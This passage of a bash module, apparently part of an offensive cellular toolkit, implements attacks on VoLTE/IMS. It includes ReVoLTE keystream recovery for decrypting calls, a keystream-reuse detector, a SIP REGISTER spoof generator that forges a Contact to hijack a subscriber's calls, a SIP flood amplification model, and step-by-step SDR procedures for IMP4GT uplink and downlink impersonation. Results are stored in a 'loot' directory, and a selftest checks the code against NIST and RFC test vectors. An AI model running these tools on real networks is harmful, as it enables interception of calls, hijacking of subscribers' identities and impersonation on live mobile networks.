why this needs hardware
  The keystream is a function of the radio-layer cipher key and the PDCP
  COUNT, which are established during RRC/NAS setup. The reuse happens when
  the network allocates the same RLC/MAC resources for a second call. Only a
  radio receiver on the target cell can see the ciphertext and the setup.

prerequisites
  * a receive-only SDR on the target downlink, with the cell's EARFCN
  * srsRAN or srsUE with a PDCP capture hook, or an IQ recorder plus a
    PDCP decoder
  * two calls from the same subscriber close together, which is what the
    network must allocate identically for the attack to apply

procedure
  1. Record the setup of call A and the whole of call A.
  2. Record call B, which reuses the resources.
  3. Feed the two ciphertext streams to the detector:
       modules/35_volte_ims.sh --detect-keystream-reuse calls.pcap
  4. If reuse is reported, recover the keystream from a known-plaintext
     segment of call A (for example a recorded announcement or the ring-back)
     and decrypt call B:
       modules/35_volte_ims.sh --keystream-recover <ctB> <knownA> <ctB2>
  5. The precondition is not guaranteed: if the allocation differs, the
     keystreams differ and the detector says so. There is no fallback.
EOF
        else
            cat <<'EOF'
objective
  Reproduce IMP4GT (Rupprecht et al., NDSS 2020): show that the LTE
  lower-layer identity mapping is not anchored at the mutually authenticated
  layer, so an attacker with a layer-2 position can impersonate the UE toward
  the network and the network toward the UE.

why this needs hardware
  The attack lives in the PHY/MAC: it needs a transmitter that can place
  uplink bursts in the victim's grant with the victim's RNTI and the right
  timing advance, and a receiver for the downlink. That layer-2 position
  cannot be reached from software alone.

prerequisites
  * a full-duplex SDR with a stable clock (GPSDO), USRP B210 or LimeSDR
  * srsRAN or a modified srsUE to drive the PHY/MAC and set the RNTI
  * a licensed or Faraday-isolated test cell, and a test UE you own
  * a layer-2 position: the attacker must be able to transmit on the cell

procedure
  1. Camp on the cell and recover the victim's C-RNTI from the downlink.
  2. Acquire the uplink timing advance for the victim's grant.
  3. Transmit uplink user-plane data with the victim's RNTI (uplink
     impersonation) and observe the network accepting it as the victim.
  4. Present downlink data to the victim as if from the eNB (downlink
     impersonation).
  5. The two directions together are the bidirectional impersonation.
EOF
        fi
    } | tee "$f"
    printf 'plan_file\t%s\nstatus\thandoff\n' "$f"
    return 0
}

# ── status ──────────────────────────────────────────────────────────────
vims_cli_status_tsv() {
    local py="none" crypt="none" radio="none"
    if command -v python3 >/dev/null 2>&1; then
        py="python3"
        crypt=$(python3 -c 'import cryptography; print(cryptography.__version__)' 2>/dev/null || echo none)
    fi
    command -v hackrf_info >/dev/null 2>&1 && radio="hackrf"
    [[ "$radio" == "none" ]] && command -v uhd_find_devices >/dev/null 2>&1 && radio="usrp"
    [[ "$radio" == "none" ]] && command -v LimeUtil >/dev/null 2>&1 && radio="limesdr"
    printf 'module\tvolte_ims\n'
    printf 'tag\tvims\n'
    printf 'python3\t%s\n' "$py"
    printf 'cryptography\t%s\n' "$crypt"
    printf 'radio\t%s\n' "$radio"
    printf 'dir\t%s\n' "$VIMS_DIR"
    printf 'plan_dir\t%s\n' "$VIMS_PLAN_DIR"
    printf 'revolte\t%s\n' "implemented in software (AES-CTR keystream reuse)"
    printf 'imp4gt\t%s\n' "model only; transmit needs a layer-2 position (handoff)"
    printf 'nist_vector\t%s\n' "SP 800-38A F.5.1 CTR-AES128.Encrypt"
    printf 'rfc_vector\t%s\n' "RFC 2617 3.5 Digest example"
}

# ── selftest ────────────────────────────────────────────────────────────
# ── SIP flooding / amplification (IEEE TQ 2024) ─────────────────────────
vims_sip_flood() {
    local method="${1:-INVITE}" rate="${2:-100}" req="${3:-400}" resp="${4:-1600}"
    [[ "$method" =~ ^[A-Za-z]+$ ]] || { printf 'ERROR\tmethod must be a token\n' >&2; return 2; }
    local m=${method^^} v
    for v in "$rate" "$req" "$resp"; do [[ "$v" =~ ^[0-9]+$ ]] || { printf 'ERROR\tnumeric rate/sizes expected\n' >&2; return 2; }; done
    awk -v m="$m" -v r="$rate" -v q="$req" -v s="$resp" 'BEGIN{
        amp = q>0 ? s/q : 0
        printf "method\t%s\nrate_rps\t%d\nrequest_bytes\t%d\nresponse_bytes\t%d\namplification\t%.2f\n", m, r, q, s, amp
        printf "bytes_per_s\t%d\n", r*(q+s)
    }'
    printf 'attack\tSIP %s flood: unauthenticated requests force per-request processing; the response size sets the amplification the origin absorbs\n' "$m"
}
# ── IMEI / location leakage over VoLTE SIP ──────────────────────────────
vims_imei_leak() {
    local msg="${1:-}"
    [[ -n "$msg" ]] || { printf 'ERROR\tusage: --imei-leak <sip-message-text>\n' >&2; return 2; }
    printf 'finding\tseverity\tdetail\n'
    local n=0
    if printf '%s' "$msg" | grep -Eq '[0-9]{15}'; then
        printf 'imei_exposed\tHIGH\ta 15-digit IMEI appears in the SIP signalling — IMSI/IMEI disclosure over the voice control plane\n'; n=$(( n + 1 ))
    fi
    if printf '%s' "$msg" | grep -Eqi 'P-Access-Network-Info'; then
        printf 'location_exposed\tHIGH\tP-Access-Network-Info present — the message carries the cell the UE is on\n'; n=$(( n + 1 ))
    fi
    if printf '%s' "$msg" | grep -Eqi 'User-Agent:.*(IMS|Android|iOS|Gm)'; then
        printf 'device_fingerprint\tMEDIUM\tUser-Agent discloses the device/stack, useful for targeting\n'; n=$(( n + 1 ))
    fi
    (( n == 0 )) && printf 'none\tINFO\tno IMEI, location or device fingerprint in the signalling\n'
    printf 'findings\t%d\n' "$n"
}
# ── SIP REGISTER spoof (registration hijack) ────────────────────────────
vims_register_spoof() {
    local impi="${1:-310150123456789@ims.mnc001.mcc310.3gppnetwork.org}" \
          contact="${2:-310150123456789@10.0.0.9}" \
          host="${3:-10.0.0.9}" \
          domain="${4:-ims.mnc001.mcc310.3gppnetwork.org}"
    [[ -n "$impi" && -n "$contact" ]] || { printf 'ERROR\tIMPI and contact required\n' >&2; return 2; }
    local branch tag callid
    branch="z9hG4bK$(printf '%08x' $(( RANDOM * RANDOM )))"
    tag="$(printf '%08x' "$RANDOM")"
    callid="$(printf '%08x%08x' "$RANDOM" "$RANDOM")@$host"
    printf 'REGISTER sip:%s SIP/2.0\n' "$domain"
    printf 'Via: SIP/2.0/UDP %s;branch=%s\n' "$host" "$branch"
    printf 'From: <sip:%s>;tag=%s\n' "$impi" "$tag"
    printf 'To: <sip:%s>\n' "$impi"
    printf 'Call-ID: %s\n' "$callid"
    printf 'CSeq: 1 REGISTER\n'
    printf 'Contact: <sip:%s>\n' "$contact"
    printf 'P-Asserted-Identity: <sip:%s>\n' "$impi"
    printf 'Content-Length: 0\n'
    printf '\nattack\tSIP REGISTER with a forged Contact — binds the subscriber identity to an attacker endpoint, hijacking inbound calls and messages\n'
}

vims_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export VIMS_DIR="$d/loot/volte_ims"
    export VIMS_PLAN_DIR="$VIMS_DIR/plans"
    mkdir -p "$VIMS_DIR" "$VIMS_PLAN_DIR"

    # 0. Crypto backend present.
    chk crypto-backend "$(command -v python3 >/dev/null 2>&1 && python3 -c 'import cryptography' 2>/dev/null && echo yes || echo no)" "yes"

    # 1. AES-CTR known-answer test: NIST SP 800-38A, F.5.1 CTR-AES128.Encrypt.
    #    Key 2b7e151628aed2a6abf7158809cf4f3c, initial counter block
    #    f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff, four plaintext blocks, ciphertext
    #    874d6191b620e3261bef6864990db6ce 9806f66b7970fdff8617187bb9fffdff
    #    5ae4df3edbd5d35e5b4f09020db03eab 1e031dda2fbe03d1792170a0f3009cee
    local nist_pt="6bc1bee22e409f96e93d7e117393172aae2d8a571e03ac9c9eb76fac45af8e5130c81c46a35ce411e5fbc1191a0a52eff69f2445df4f9b17ad2b417be66c3710"
    local nist_ct="874d6191b620e3261bef6864990db6ce9806f66b7970fdff8617187bb9fffdff5ae4df3edbd5d35e5b4f09020db03eab1e031dda2fbe03d1792170a0f3009cee"
    chk nist-ctr-aes128 "$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff "$nist_pt")" "$nist_ct"

    # 2. ReVoLTE XOR identity with a worked example: two known plaintexts
    #    encrypted under one keystream; the XOR of the ciphertexts is the XOR
    #    of the plaintexts and the keystream decrypts both.
    local p1="48656c6c6f20566f4c544520414d5221" p2="414d522073696c656e6365206672616d"
    out=$(vims_cmd_revolte_demo "$p1" "$p2"); rc=$?
    chk revolte-rc "$rc" "0"
    chk revolte-xor-identity "$(fld "$out" xor_identity)" "match"
    chk revolte-xor-c-eq-p "$(fld "$out" xor_ciphertexts)" "$(fld "$out" xor_plaintexts)"
    chk revolte-ks-match "$(fld "$out" keystream_match)" "yes"
    chk revolte-recovered "$(fld "$out" recovered_match)" "yes"
    chk revolte-recovered-value "$(fld "$out" recovered_plaintext2)" "$p2"
    chk revolte-status "$(fld "$out" status)" "demonstrated"
    # same length enforced
    chk revolte-unequal "$(vims_cmd_revolte_demo "$p1" "aabb" >/dev/null 2>&1; echo $?)" "1"
    chk revolte-bad-hex "$(vims_cmd_revolte_demo "zz" "$p2" >/dev/null 2>&1; echo $?)" "2"
    chk revolte-missing "$(vims_cmd_revolte_demo "$p1" >/dev/null 2>&1; echo $?)" "2"

    # 3. Keystream recovery. Build c1/c2 under the published NIST keystream and
    #    recover p2 from a known plaintext of c1.
    #    The keystream is the NIST CTR stream; c1 = p1 XOR ks, c2 = p2 XOR ks.
    local ks=""
    ks=$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff \
        "00000000000000000000000000000000")
    local c1 c2
    c1=$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff "$p1")
    c2=$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff "$p2")
    # with the full known plaintext the second stream is recovered entirely
    out=$(vims_cmd_keystream_recover "$c1" "$p1" "$c2"); rc=$?
    chk ksr-rc "$rc" "0"
    chk ksr-status-complete "$(fld "$out" status)" "complete"
    chk ksr-keystream "$(fld "$out" keystream)" "$ks"
    chk ksr-recovered-full "$(fld "$out" recovered_second)" "$p2"
    chk ksr-remainder-bytes "$(fld "$out" remainder_bytes)" "0"
    # with an 8-byte known-plaintext prefix only the prefix keystream is known;
    # the module must say so rather than guess the remainder
    local kp_pre="${p1:0:16}"
    out=$(vims_cmd_keystream_recover "$c1" "$kp_pre" "$c2")
    chk ksr-prefix-status "$(fld "$out" status)" "partial"
    chk ksr-prefix-bytes "$(fld "$out" keystream_bytes)" "8"
    chk ksr-prefix-recovered "$(fld "$out" recovered_second)" "${p2:0:16}"
    chk ksr-prefix-remainder "$(fld "$out" remainder_bytes)" "8"
    chk ksr-prefix-keystream "$(fld "$out" keystream)" "${ks:0:16}"
    chk ksr-bad-hex "$(vims_cmd_keystream_recover zz "$p1" >/dev/null 2>&1; echo $?)" "2"
    chk ksr-missing "$(vims_cmd_keystream_recover "$c1" >/dev/null 2>&1; echo $?)" "2"

    # 4. Keystream-reuse detector, both directions.
    vims_py mkfixture "$d/reuse.pcap" reuse
    vims_py mkfixture "$d/noreuse.pcap" noreuse
    out=$(vims_cmd_detect_reuse "$d/reuse.pcap" 9999); rc=$?
    chk reuse-rc "$rc" "0"
    chk reuse-fires "$(fld "$out" status)" "keystream_reuse"
    out=$(vims_cmd_detect_reuse "$d/noreuse.pcap" 9999)
    chk noreuse-clean "$(fld "$out" status)" "no_reuse"
    chk reuse-bad-pcap "$(vims_cmd_detect_reuse /nonexistent.pcap 9999 >/dev/null 2>&1; echo $?)" "1"
    chk reuse-bad-port "$(vims_cmd_detect_reuse "$d/reuse.pcap" xx >/dev/null 2>&1; echo $?)" "2"

    # 5. SIP parse on a real REGISTER.
    local reg hex
    reg=$(vims_py msgs register)
    out=$(vims_cmd_sip_parse "$reg"); rc=$?
    chk sip-register-rc "$rc" "0"
    chk sip-register-type "$(fld "$out" type)" "request"
    chk sip-register-method "$(fld "$out" method)" "REGISTER"
    chk sip-register-uri "$(fld "$out" request_uri)" "sip:ims.mnc001.mcc310.3gppnetwork.org"
    chk sip-register-via-count "$(fld "$out" via_count)" "1"
    chk sip-register-from "$([[ "$(fld "$out" from)" == *310150123456789* ]] && echo yes || echo no)" "yes"
    chk sip-register-to "$([[ "$(fld "$out" to)" == *310150123456789* ]] && echo yes || echo no)" "yes"
    chk sip-register-contact "$([[ "$(fld "$out" contact)" == *"2001:db8::1"* ]] && echo yes || echo no)" "yes"
    chk sip-register-cseq "$(fld "$out" cseq)" "1 REGISTER"
    chk sip-register-expires "$(fld "$out" expires)" "600000"
    # INVITE with SDP
    hex=$(vims_py msgs invite)
    out=$(vims_cmd_sip_parse "$hex")
    chk sip-invite-method "$(fld "$out" method)" "INVITE"
    chk sip-invite-sdp-ver "$(fld "$out" sdp_version)" "0"
    chk sip-invite-sdp-media "$(fld "$out" sdp_media)" "audio 49152 RTP/AVP 97 98"
    chk sip-invite-sdp-rtpmap "$(fld "$out" sdp_rtpmap)" "97 AMR/8000,98 AMR-WB/16000"
    chk sip-invite-sdp-conn "$(fld "$out" sdp_connection)" "IN IP6 2001:db8::1"
    chk sip-bad-hex "$(vims_cmd_sip_parse zz >/dev/null 2>&1; echo $?)" "2"
    chk sip-missing "$(vims_cmd_sip_parse >/dev/null 2>&1; echo $?)" "2"
    # a tab inside a header value must not forge a TSV field
    local tabmsg tabhex
    tabmsg=$(printf 'REGISTER sip:x SIP/2.0\r\nFrom: <sip:a@b>\t;tag=1\r\nTo: <sip:a@b>\r\nContent-Length: 0\r\n\r\n')
    tabhex=$(printf '%s' "$tabmsg" | vims_hex_of)
    chk sip-tab-sanitised "$(vims_cmd_sip_parse "$tabhex" | awk -F'\t' 'NF!=2{n++} END{print n+0}')" "0"

    # 6. IMS registration flow: REGISTER -> 401 challenge -> authenticated
    #    REGISTER -> 200 OK, plus the RFC 2617 3.5 digest known answer.
    out=$(vims_cmd_ims_registration "$(vims_py msgs register)")
    chk ims-reg-step "$(fld "$out" flow_step)" "1_register_initial"
    out=$(vims_cmd_ims_registration "$(vims_py msgs challenge)")
    chk ims-401-step "$(fld "$out" flow_step)" "2_challenge"
    chk ims-401-realm "$(fld "$out" challenge_realm)" "ims.mnc001.mcc310.3gppnetwork.org"
    chk ims-401-nonce "$(fld "$out" challenge_nonce)" "Q2hhbGxlbmdl"
    chk ims-401-alg "$(fld "$out" challenge_algorithm)" "AKAv1-MD5"
    out=$(vims_cmd_ims_registration "$(vims_py msgs register_auth)")
    chk ims-auth-step "$(fld "$out" flow_step)" "3_register_authenticated"
    chk ims-auth-nonce "$(fld "$out" auth_nonce)" "Q2hhbGxlbmdl"
    chk ims-auth-digest-skipped "$(fld "$out" digest_check)" "not_attempted"
    out=$(vims_cmd_ims_registration "$(vims_py msgs ok)")
    chk ims-ok-step "$(fld "$out" flow_step)" "4_registered"
    # RFC 2617 section 3.5 worked example
    chk rfc2617-ha1 "$(vims_fld "$(vims_py digest 'Mufasa' 'testrealm@host.com' 'Circle Of Life' GET '/dir/index.html' 'dcd98b7102dd2f0e8b11d0f600bfb0c093' '00000001' '0a4f113b' 'auth')" ha1)" "939e7578ed9e3c518a452acee763bce9"
    chk rfc2617-response "$(vims_fld "$(vims_py digest 'Mufasa' 'testrealm@host.com' 'Circle Of Life' GET '/dir/index.html' 'dcd98b7102dd2f0e8b11d0f600bfb0c093' '00000001' '0a4f113b' 'auth')" response)" "6629fae49393a05397450978507c4ef1"
    chk ims-bad-hex "$(vims_cmd_ims_registration zz >/dev/null 2>&1; echo $?)" "2"
    chk ims-missing "$(vims_cmd_ims_registration >/dev/null 2>&1; echo $?)" "2"

    # 7. IMP4GT model: sequence, preconditions, layer-2 position, handoff.
    out=$(vims_imp4gt_model); rc=$?
    chk imp4gt-rc "$rc" "0"
    chk imp4gt-paper "$(printf '%s\n' "$out" | grep -ci 'NDSS 2020')" "1"
    chk imp4gt-status "$(printf '%s\n' "$out" | grep -c '^status	handoff')" "1"
    chk imp4gt-layer2 "$([[ "$(printf '%s\n' "$out" | grep -ci 'layer-2 position')" -ge 1 ]] && echo yes || echo no)" "yes"
    chk imp4gt-bidirectional "$(printf '%s\n' "$out" | grep -ci 'downlink impersonation')" "1"
    chk imp4gt-radio "$([[ "$(printf '%s\n' "$out" | grep -ci 'USRP\|LimeSDR')" -ge 1 ]] && echo yes || echo no)" "yes"

    # 8. Plans: handoff, radio named, layer-2 position named for IMP4GT.
    out=$(vims_plan revolte-capture)
    chk plan-revolte-status "$(printf '%s\n' "$out" | grep -c '^status: handoff')" "1"
    chk plan-revolte-radio "$([[ "$(printf '%s\n' "$out" | grep -ci 'USRP\|LimeSDR\|HackRF')" -ge 1 ]] && echo yes || echo no)" "yes"
    out=$(vims_plan imp4gt-lab)
    chk plan-imp4gt-status "$(printf '%s\n' "$out" | grep -c '^status: handoff')" "1"
    chk plan-imp4gt-radio "$([[ "$(printf '%s\n' "$out" | grep -ci 'USRP\|LimeSDR')" -ge 1 ]] && echo yes || echo no)" "yes"
    local pf; pf=$(find "$VIMS_PLAN_DIR" -name 'plan_imp4gt-lab_*.txt' | head -n1)
    chk plan-imp4gt-layer2 "$([[ "$(grep -ci 'layer-2 position' "$pf")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-imp4gt-file-status "$(grep -c '^status: handoff' "$pf")" "1"
    chk plan-unknown "$(vims_plan nope >/dev/null 2>&1; echo $?)" "2"

    # 9. Status TSV invariants.
    out=$(vims_cli_status_tsv)
    chk status-dir "$(fld "$out" dir)" "$VIMS_DIR"
    chk status-tag "$(fld "$out" tag)" "vims"

    # 10. SIP flooding / leakage / REGISTER spoof.
    out=$(vims_sip_flood INVITE 100 400 1600)
    chk flood-method "$(fld "$out" method)" "INVITE"
    chk flood-amp "$(fld "$out" amplification)" "4.00"
    chk flood-bad "$(vims_sip_flood 'BAD METHOD' 1 1 1 >/dev/null 2>&1; echo $?)" "2"
    chk imei-exposed "$(vims_imei_leak 'User-Agent: IMS 353285060000001' | awk -F'\t' '$1=="imei_exposed"{print $2}')" "HIGH"
    chk imei-loc "$(vims_imei_leak 'P-Access-Network-Info: 3GPP-E-UTRAN-FDD;cell=310260' | awk -F'\t' '$1=="location_exposed"{print $2}')" "HIGH"
    chk imei-clean "$(vims_imei_leak 'INVITE sip:x SIP/2.0' | awk -F'\t' '$1=="none"{print $2}')" "INFO"
    out=$(vims_register_spoof)
    chk reg-spoof "$(printf '%s' "$out" | grep -c '^REGISTER sip:')" "1"
    chk reg-contact "$(printf '%s' "$out" | grep -c '^Contact:')" "1"
    chk reg-pai "$(printf '%s' "$out" | grep -c '^P-Asserted-Identity:')" "1"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    rm -rf "$d"
    trap - EXIT
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
vims_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== VoLTE / IMS ===${C_RESET}"
        echo -e "  loot: ${C_DIM}$VIMS_DIR${C_RESET}\n"
        cat <<'M'
  [1]  ReVoLTE demo (two plaintexts, one keystream)
  [2]  recover a keystream from a known plaintext
  [3]  detect keystream reuse in a capture
  [4]  parse a SIP message (hex)
  [5]  IMS registration flow (hex)
  [6]  IMP4GT model (sequence + preconditions)
  [7]  write a handoff plan (revolte-capture / imp4gt-lab)
  [0]  back

M
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) read -rp "  plaintext1 hex> " a; read -rp "  plaintext2 hex> " b
               vims_cmd_revolte_demo "$a" "$b" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            2) read -rp "  ciphertext hex> " a; read -rp "  known plaintext hex> " b
               read -rp "  second ciphertext hex (blank)> " s
               vims_cmd_keystream_recover "$a" "$b" "$s" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            3) read -rp "  pcap> " p; read -rp "  udp port (0=any)> " pt
               vims_cmd_detect_reuse "$p" "$pt" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            4) read -rp "  hex> " h; vims_cmd_sip_parse "$h" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            5) read -rp "  hex> " h; vims_cmd_ims_registration "$h" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            6) vims_imp4gt_model | column -t -s$'\t' 2>/dev/null || vims_imp4gt_model
               read -rp "  press enter " _ ;;
            7) read -rp "  plan (revolte-capture|imp4gt-lab)> " k
               vims_plan "$k"; read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
vims_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)             vims_cli_status_tsv ;;
        --revolte-demo)           vims_cmd_revolte_demo "${1:-}" "${2:-}" ;;
        --keystream-recover)      vims_cmd_keystream_recover "${1:-}" "${2:-}" "${3:-}" ;;
        --imp4gt-model)           vims_imp4gt_model ;;
        --sip-parse)              vims_cmd_sip_parse "${1:-}" ;;
        --ims-registration)       vims_cmd_ims_registration "${1:-}" "${2:-}" ;;
        --detect-keystream-reuse) vims_cmd_detect_reuse "${1:-}" "${2:-0}" ;;
        --sip-flood)              vims_sip_flood "${1:-INVITE}" "${2:-100}" "${3:-400}" "${4:-1600}" ;;
        --imei-leak)              vims_imei_leak "${1:-}" ;;
        --register-spoof)         vims_register_spoof "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
        --plan)                   vims_plan "${1:-}" ;;
        --selftest)               vims_selftest ;;
        --menu)                   vims_menu ;;
        *)
            cat >&2 <<EOF
VoLTE / IMS Attacks — ReVoLTE keystream reuse, IMP4GT, SIP and IMS registration

Usage: $0 COMMAND
  --status-tsv                              module state as TSV
  --revolte-demo <pt1-hex> <pt2-hex>        same-keystream XOR demonstration
  --keystream-recover <ct> <known-pt> [ct2] recover the keystream and decrypt
  --imp4gt-model                            IMP4GT sequence and preconditions
  --sip-parse <hex>                         SIP request/response, headers, SDP
  --sip-flood [method] [rps] [reqB] [respB] SIP flood / amplification model
  --imei-leak <sip-text>                    IMEI / location / device leakage over SIP
  --register-spoof [impi] [contact]         SIP REGISTER with a forged Contact
  --ims-registration <hex> [aka-res-hex]    IMS REGISTER/401/AKA flow
  --detect-keystream-reuse <pcap> [port]    reuse detector
  --plan <revolte-capture|imp4gt-lab>       write a handoff plan
  --selftest                                verify crypto and parsers, no radio
  --menu                                    interactive menu

Papers: ReVoLTE (Rupprecht, Kohls, Holz, Popper), USENIX Security 2020;
IMP4GT (same authors), NDSS 2020. Crypto known answer: NIST SP 800-38A F.5.1;
Digest known answer: RFC 2617 section 3.5.
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    vims_cli_main "$@"
fi
